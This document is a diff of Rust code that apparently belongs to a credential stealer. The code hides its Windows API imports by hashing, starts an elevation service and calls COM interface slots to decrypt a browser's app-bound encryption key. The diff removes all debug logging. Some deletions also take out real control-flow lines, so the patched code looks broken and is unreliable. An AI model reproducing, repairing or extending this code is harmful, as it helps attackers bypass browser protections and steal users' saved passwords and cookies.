@@ -5,7 +5,6 @@ use std::mem;
 use std::os::windows::ffi::OsStrExt;
 use std::sync::OnceLock;
 
-use crate::dbg_log;
 use crate::core_utils::api_hash::{
     H_KERNEL32, H_OLE32, H_OLEAUT32, H_ADVAPI32,
     H_LoadLibraryA, H_GetProcAddress,
@@ -112,9 +111,7 @@ fn init_com() -> Option<&'static ComApis> {
         let sa = resolve_fn_by_hash(H_OLEAUT32, H_SysAllocStringByteLen);
         let sf = resolve_fn_by_hash(H_OLEAUT32, H_SysFreeString);
         let sl = resolve_fn_by_hash(H_OLEAUT32, H_SysStringByteLen);
-        dbg_log!("elev: resolve ci={:?} cu={:?} cc={:?} cp={:?} sa={:?} sf={:?} sl={:?}", ci, cu, cc, cp, sa, sf, sl);
         if ci.is_null() || cu.is_null() || cc.is_null() || cp.is_null() || sa.is_null() || sf.is_null() || sl.is_null() {
-            dbg_log!("elev: some COM APIs null");
             return None;
         }
         Some(ComApis {
@@ -152,24 +149,19 @@ fn init_svc() -> Option<&'static SvcApis> {
 fn start_service(name: &str) {
     let svc = match init_svc() {
         Some(s) => s,
-        None => { dbg_log!("elev: svc APIs not available"); return; }
     };
     unsafe {
         let scm = (svc.open_scm)(std::ptr::null(), std::ptr::null(), 0x0001);
-        if scm.is_null() { dbg_log!("elev: OpenSCManager failed"); return; }
         let wide: Vec<u16> = std::ffi::OsStr::new(name).encode_wide().chain(Some(0)).collect();
         let h = (svc.open_svc)(scm, wide.as_ptr(), 0x0010);
         if h.is_null() {
-            dbg_log!("elev: OpenService '{}' not found", name);
             (svc.close_svc)(scm, 0);
             return;
         }
         let r = (svc.start_svc)(h, 0, std::ptr::null());
         if r == 0 {
             let err = std::io::Error::last_os_error();
-            dbg_log!("elev: StartService '{}' err: {}", name, err);
         } else {
-            dbg_log!("elev: StartService '{}' OK", name);
         }
         (svc.close_svc)(h, 0);
         (svc.close_svc)(scm, 0);
@@ -248,40 +240,32 @@ fn install_veh() {
 unsafe fn try_slots(punk: *mut c_void, enc: &[u8], slots: &[usize]) -> Result<Vec<u8>, String> {
     let api = init_com().ok_or("no com")?;
     let vtbl = *(punk as *const *const c_void);
-    dbg_log!("elev: vtbl={:?}", vtbl);
 
     for &slot in slots {
         let slot_ptr = (vtbl as *const *const c_void).add(slot);
         let fn_ptr = *(slot_ptr);
-        dbg_log!("elev: slot {} fn={:?}", slot, fn_ptr);
-        if fn_ptr.is_null() { dbg_log!("elev: slot {} null", slot); continue; }
         let dec: FnDec = mem::transmute_copy(&fn_ptr);
 
         let cipher = match Bstr::new(enc) {
             Some(c) => c,
-            None => { dbg_log!("elev: slot {} bstr fail", slot); continue; }
         };
         let mut plain: *mut u16 = std::ptr::null_mut();
         let mut err: u32 = 0;
         SLOT_CRASHED = false;
         let hr = dec(punk, cipher.ptr(), &mut plain, &mut err);
         if SLOT_CRASHED {
-            dbg_log!("elev: slot {} ACCESS VIOLATION", slot);
             continue;
         }
         if hr < 0 || plain.is_null() {
-            dbg_log!("elev: slot {} failed hr=0x{:08X} err={}", slot, hr as u32, err);
             continue;
         }
         let len = (api.sys_len)(plain) as usize;
         let data = std::slice::from_raw_parts(plain as *const u8, len).to_vec();
         (api.sys_free)(plain);
-        dbg_log!("elev: slot {} got {} bytes", slot, data.len());
         if data.len() == 32 { return Ok(data); }
         if data.len() > 32 {
             let tail = &data[data.len()-32..];
             if tail.iter().any(|&b| b != 0) {
-                dbg_log!("elev: slot {} KEY (tail)", slot);
                 return Ok(tail.to_vec());
             }
         }
@@ -292,11 +276,9 @@ unsafe fn try_slots(punk: *mut c_void, enc: &[u8], slots: &[usize]) -> Result<Ve
 unsafe fn try_one(clsid: &[u8], iid: &[u8], enc: &[u8], slots: &[usize]) -> Result<Vec<u8>, String> {
     let api = init_com().ok_or("no com")?;
     let hr = (api.co_init)(std::ptr::null(), COINIT_MULTITHREADED);
-    dbg_log!("elev: CoInit hr=0x{:08X}", hr as u32);
 
     let mut punk: *mut c_void = std::ptr::null_mut();
     let hr = (api.co_create)(clsid.as_ptr() as *const c_void, std::ptr::null(), CLSCTX_LOCAL_SERVER, iid.as_ptr() as *const c_void, &mut punk);
-    dbg_log!("elev: CoCreate hr=0x{:08X} punk={:?}", hr as u32, punk.is_null());
     if hr < 0 || punk.is_null() {
         (api.co_uninit)();
         return Err(format!("CoCreate 0x{:08X}", hr as u32));
@@ -348,7 +330,6 @@ fn hex_to_guid_bytes(hex: &str) -> Vec<u8> {
 }
 
 pub fn try_decrypt_app_bound_key(encrypted_key: &[u8]) -> Option<Vec<u8>> {
-    dbg_log!("elev: START ({} bytes)", encrypted_key.len());
 
     let result = std::panic::catch_unwind(std::panic::AssertUnwindSafe(|| {
         try_decrypt_inner(encrypted_key)
@@ -357,7 +338,6 @@ pub fn try_decrypt_app_bound_key(encrypted_key: &[u8]) -> Option<Vec<u8>> {
     match result {
         Ok(r) => r,
         Err(_) => {
-            dbg_log!("elev: PANIC caught");
             None
         }
     }
@@ -365,10 +345,8 @@ pub fn try_decrypt_app_bound_key(encrypted_key: &[u8]) -> Option<Vec<u8>> {
 
 fn try_decrypt_inner(encrypted_key: &[u8]) -> Option<Vec<u8>> {
     if init_com().is_none() {
-        dbg_log!("elev: COM init failed");
         return None;
     }
-    dbg_log!("elev: COM APIs resolved OK");
 
     install_veh();
 
@@ -377,24 +355,19 @@ fn try_decrypt_inner(encrypted_key: &[u8]) -> Option<Vec<u8>> {
         std::thread::sleep(std::time::Duration::from_millis(400));
 
         let clsid = hex_to_guid_bytes(b.clsid_hex);
-        if clsid.len() != 16 { dbg_log!("elev: bad clsid for {}", b.name); continue; }
 
         for iid_hex in b.iids_hex {
             let iid = hex_to_guid_bytes(iid_hex);
             if iid.len() != 16 { continue; }
-            dbg_log!("elev: trying '{}' IID={}...", b.name, iid_hex);
             match unsafe { try_one(&clsid, &iid, encrypted_key, b.slots) } {
                 Ok(key) => {
                     if key.len() == 32 {
-                        dbg_log!("elev: '{}' OK (32 bytes)", b.name);
                         return Some(key);
                     }
                 }
-                Err(e) => { dbg_log!("elev: '{}' {}", b.name, e); }
             }
         }
     }
 
-    dbg_log!("elev: all failed");
     None
 }
